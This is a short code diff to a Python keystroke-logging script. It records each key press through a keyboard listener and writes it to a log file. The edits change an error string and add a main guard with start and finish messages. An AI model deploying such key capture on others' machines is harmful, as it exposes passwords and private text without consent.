@@ -13,7 +13,7 @@ def on_press(key):
         if key.find('>') > 0:
             key = numbers[key]
     except KeyError:
-        key = "?Error?"
+        key = "[Error]"
 
     save(key)
 
@@ -36,5 +36,10 @@ def save(key):
             log.write(key)
 
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+if __name__ == '__main__':
+    print("start listening...")
+
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+    print("---------- finish listening ----------")
